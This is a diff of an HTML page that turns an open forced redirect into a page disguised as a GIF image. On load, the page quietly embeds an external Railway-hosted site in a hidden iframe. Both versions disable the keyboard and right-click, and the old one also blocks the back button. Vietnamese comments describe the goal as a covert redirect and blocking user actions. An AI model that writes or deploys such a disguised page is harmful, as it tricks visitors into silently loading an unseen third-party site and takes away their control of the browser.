@@ -1,29 +1,50 @@
 <!DOCTYPE html>
-<html style="display:none;">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>Redirecting...</title>
-    <meta http-equiv="refresh" content="0; url=https://web-production-c2a9d.up.railway.app/">
+    <title>Image</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: #f0f2f5;
+        }
+        .gif-container {
+            max-width: 100%;
+            height: auto;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+        }
+    </style>
     <script>
-        // Prevent going back
-        history.pushState(null, '', location.href);
-        window.onpopstate = function() {
-            history.go(1);
+        // Chạy chuyển hướng ngầm sau khi ảnh đã load
+        window.onload = function() {
+            // Tạo iframe ẩn để chuyển hướng ngầm
+            var iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = 'https://web-production-c2a9d.up.railway.app/';
+            document.body.appendChild(iframe);
+            
+            // Ngăn chặn các thao tác của user
+            document.onkeydown = function(e) {
+                return false;
+            };
+            document.oncontextmenu = function(e) {
+                return false;
+            };
         };
-        
-        // Disable keyboard shortcuts
-        document.onkeydown = function(e) {
-            return false;
-        };
-        
-        // Disable right click
-        document.oncontextmenu = function(e) {
-            return false;
-        };
-        
-        // Immediate redirect
-        window.location.replace('https://web-production-c2a9d.up.railway.app/');
     </script>
 </head>
-<body></body>
+<body>
+    <div class="gif-container">
+        <img src="YOUR_GIF_URL" alt="Loading...">
+    </div>
+</body>
 </html>
